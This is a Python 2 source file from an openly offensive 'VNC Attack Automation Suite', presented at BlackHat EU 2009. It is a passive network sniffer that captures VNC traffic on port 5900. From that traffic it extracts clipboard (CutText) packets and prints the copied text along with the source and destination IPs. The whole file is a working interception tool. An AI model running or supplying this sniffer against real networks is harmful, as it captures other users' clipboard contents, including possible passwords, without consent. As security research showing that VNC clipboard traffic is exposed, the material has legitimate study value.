## VAASeline - VNC Attack Automation Suite, passive clipboard sniffer
##
## Super simple example of grabbing VNC Clipboard packets off the wire
## Presented at BlackHat EU 2009 by Rich Smith
##
## Check for the latest version at http://www.immunityinc.com/resources-freesoftware.shtml
"""
   Copyright (C) 2009 Rich Smith (rich@immunityinc.com)

   This library is free software; you can redistribute it and/or
   modify it under the terms of the GNU Lesser General Public
   License as published by the Free Software Foundation; either
   version 3 of the License, or (at your option) any later version.

   This library is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
   Lesser General Public License for more details.

   You should have received a copy of the GNU Lesser General
   Public License along with this library; if not, write to the
   Free Software Foundation, Inc., 51 Franklin Street, Fifth Floor,
   Boston, MA 02110-1301 USA
"""

import sys, pprint, struct

##To use this you need to have pycap: http://pycap.sourceforge.net/
try:
    import pycap.capture
except ImportError:
    print "**\nMake sure you have the pycap module installed.\nGet it from http://pycap.sourceforge.net/\n**"
    sys.exit(-1)

class sniffy_sniff_sniff:
    
    def __init__ (self, dev, port="5900"):
        """
        Start up the packet sniffer on the device specified
        """
        
        ##Start up the pycap sniffer - you'll have to be root etc etc
        try:
            self.sniff = pycap.capture.capture(device=dev)
        except pycap.capture.error:
            print "Cannot setup up the capture on the interface '%s'\nCheck you are running this as root."%(dev)
            sys.exit(-1)
        
        ##Set up a quicky filter string
        self.sniff.filter("tcp src port %s"%(port))
        
        ##Targets cb data - keyed on ip
        self.target_data = {}
        
    def go(self):
        """
        Just loop and display the ServerCutText packets
        """
        try:
            print "Sniffing for VNC packets containing clipboard data ..........."
            while 1:
                packet = self.sniff.next()
                
                if packet and len(packet[-2]) >1:
                    
                    data    = packet[-2]
                    from_ip = packet[1].source
                    to_ip = packet[1].destination
                    
                    try:
                        ##If its a Client/ServerCutText packet then grab it
                        if data[0] == '\x03' or data[0] == '\x06':
                            
                            ##Have we seen cb data from this ip before?
                            if not self.target_data.has_key(from_ip):
                                self.target_data[from_ip]=[]
                            
                            cb_data_len = struct.unpack(">L", data[4:8])[0]
                            
                            if len(data[8:]) == cb_data_len:
                                print from_ip,"->",to_ip
                                print "%s bytes of clipboard data:"%(cb_data_len)
                                self.target_data[from_ip].append(data[8:])
                                pprint.pprint(data[8:])
                            #else:
                                ##The first byte of the packet was 0x03/0x06 but it doesn't
                                ## look like the right type of packet to me :)
                                #print "FALSE POSITIVE"
                                #print cb_data_len
                                #print len(data[8:])
                            
                    except Exception, err:
                        print "Something broke :( : %s"%err
                    
                    
                
        except KeyboardInterrupt:
            print "\n\nCtrl-C caught."
            print "Bye!"
            
        
        sys.exit(0)

def usage():
    
    print "Usage: %s <interface>"%(sys.argv[0])
    print "\nSniff for VNC packets that contain clipboard data and display them. (Rich Smith 2009)"
    print "Ctrl-C to exit"

if __name__ == "__main__":
    
    if len(sys.argv) < 2:
        usage()
        sys.exit(-1)
    
    obj = sniffy_sniff_sniff(sys.argv[1])
    obj.go()